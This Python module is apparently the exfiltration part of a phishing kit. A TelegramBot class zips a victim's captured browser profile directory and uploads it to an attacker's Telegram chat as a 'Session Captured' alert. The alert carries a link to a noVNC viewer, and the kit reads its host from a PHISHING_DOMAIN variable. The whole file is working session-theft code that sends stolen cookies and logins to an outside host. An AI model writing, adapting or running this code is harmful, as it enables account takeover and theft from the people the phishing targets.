#!/usr/bin/env python3
"""
Telegram Bot - Simple, working alerts
"""

import requests
import json
import os
from pathlib import Path
from typing import Optional


class TelegramBot:
    def __init__(self, bot_token: str, chat_id: str, domain: str = "localhost"):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.domain = domain
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        self.sent: set = set()
    
    @property
    def is_configured(self) -> bool:
        return bool(self.bot_token and self.chat_id)
    
    def send_message(self, text: str, buttons: list = None) -> bool:
        """Send text message"""
        if not self.is_configured:
            return False
        
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        
        if buttons:
            payload["reply_markup"] = json.dumps({"inline_keyboard": buttons})
        
        try:
            r = requests.post(f"{self.api_url}/sendMessage", json=payload, timeout=10)
            print(f"[TG] sendMessage: {r.status_code}", flush=True)
            return r.status_code == 200
        except Exception as e:
            print(f"[TG] Error: {e}", flush=True)
            return False
    
    def send_file(self, file_path: str, caption: str = "", buttons: list = None) -> bool:
        """Send file"""
        file_path = str(file_path)
        if not self.is_configured or not Path(file_path).exists():
            print(f"[TG] File check failed: configured={self.is_configured}, exists={Path(file_path).exists()}", flush=True)
            return False
        
        try:
            print(f"[TG] Uploading: {file_path}", flush=True)
            print(f"[TG] File size: {Path(file_path).stat().st_size}", flush=True)
            
            # Read file into memory first
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            files = {'document': (Path(file_path).name, file_data)}
            data = {
                'chat_id': self.chat_id,
                'caption': caption,
                'parse_mode': 'HTML'
            }
            if buttons:
                data['reply_markup'] = json.dumps({"inline_keyboard": buttons})
            
            print(f"[TG] Posting to API...", flush=True)
            r = requests.post(f"{self.api_url}/sendDocument", files=files, data=data, timeout=60)
            print(f"[TG] sendDocument: {r.status_code}", flush=True)
            if r.status_code != 200:
                print(f"[TG] Response: {r.text[:200]}", flush=True)
            return r.status_code == 200
        except Exception as e:
            print(f"[TG] File error: {e}", flush=True)
            import traceback
            traceback.print_exc()
            return False
    
    def send_session(self, session_id: str, profile_path: str, domain: str = "") -> bool:
        """Send web session zip"""
        if session_id in self.sent:
            return False
        self.sent.add(session_id)
        
        profile_dir = Path(profile_path)
        if not profile_dir.exists():
            return False
        
        # Create zip
        import zipfile
        import tempfile
        
        with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
            zip_path = tmp.name
        
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for f in profile_dir.rglob('*'):
                    if f.is_file():
                        zf.write(f, f.relative_to(profile_dir))
            
            caption = f"✅ <b>Session Captured</b>\n\n🌐 {domain}\n\nZip dumped"
            
            ip = self.domain if self.domain != "localhost" else "127.0.0.1"
            buttons = [[{"text": "🚀 View", "url": f"http://{ip}:6080/vnc.html"}]]
            
            return self.send_file(zip_path, caption, buttons)
        finally:
            Path(zip_path).unlink(missing_ok=True)


# Singleton
_bot: Optional[TelegramBot] = None

def get_bot() -> TelegramBot:
    global _bot
    if _bot is None:
        _bot = TelegramBot(
            os.environ.get("TELEGRAM_BOT_TOKEN", ""),
            os.environ.get("TELEGRAM_CHAT_ID", ""),
            os.environ.get("PHISHING_DOMAIN", "localhost")
        )
    return _bot
